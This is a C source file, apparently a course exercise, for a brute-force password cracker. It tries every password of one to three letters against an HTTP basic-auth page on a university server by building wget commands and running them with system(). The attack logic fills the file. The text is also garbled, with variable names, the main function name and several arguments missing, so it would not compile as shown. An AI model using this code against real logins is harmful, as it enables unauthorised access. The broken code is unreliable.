#include<stdio.h>
#include<strings.h>
#include<stdlib.h>
#include<ctype.h>

#define MINSIZE 26
#define MAXSIZE 52
#define MAX_SIZE 255


int CrackPasswd(char *passwd)
{
   int flag;
   char string1[MAX_SIZE],string2[MAX_SIZE],[MAX_SIZE];
      
   strcpy(string1,"wget http://sec-crack.cs.rmit.edu./SEC/2/");
   strcpy(string2," --http-user= --http-passwd='");
   strcpy(,"");
        
   strcat(, string1);
   strcat(, string2);
   strcat(, passwd);
   strcat(, "'");
   printf("Sending Request as %s\n",);
   flag = system();
   
   if (flag == 0)
   {
      printf("\nPassword is %s\n",passwd);
      return 1;
   }
    
   strcpy(,""); 
   return 0;
}  


int BruteForce(char *CharArray)
{
   int i, j, k;
   char passwd[MAX_SIZE];
   
   for (i=0;i<MAX_SIZE;i++)   
      passwd[i] = '\0';
      
   for(i=0;i<MAXSIZE;i++)
   {
      passwd[0] = CharArray[i];
      if(CrackPasswd(passwd) == 1)
         return 1;       
   }

   for(i=0;i<MAXSIZE;i++)
   {
      passwd[0] = CharArray[i];
      
      for(j=0;j<MAXSIZE;j++)
      {
         passwd[1] = CharArray[j];
         if(CrackPasswd(passwd) == 1)
            return 1;
      }
   }  
   
   for(i=0;i<MAXSIZE;i++)
   {
      passwd[0] = CharArray[i];
      
      for(j=0;j<MAXSIZE;j++)
      {
         passwd[1] = CharArray[j];
         
         for(k=0;k<MAXSIZE;k++)
         {
            passwd[2] = CharArray[k];
            if(CrackPasswd(passwd) == 1)
               return 1;       
         }
      }
   }
    return 0;
}


int  (int argc, char *argv[])
{
   char CharArray[MAXSIZE];
   char ch='a';
   int i,j;
   
   int , end;    
   
    = time();
     
   strcpy(CharArray,"");
   
   for (i=0;i<MINSIZE;i++)
   {
      CharArray[i]=ch;
      ch++;
   }
   
   ch='A';  
   for (i=MINSIZE;i<MAXSIZE;i++)
   {
      CharArray[i]=ch;
      ch++;
   }
    
   if (argc != 1)
   {
      fprintf(stdout,"Usage : ./BruteForce \n");
      return(EXIT_FAILURE);
   }
   
   BruteForce(CharArray);
  
   getpid();
   end = time(); 
   printf("Time Required = %lld msec\n",(end-)/());
   return (EXIT_SUCCESS);
  
}
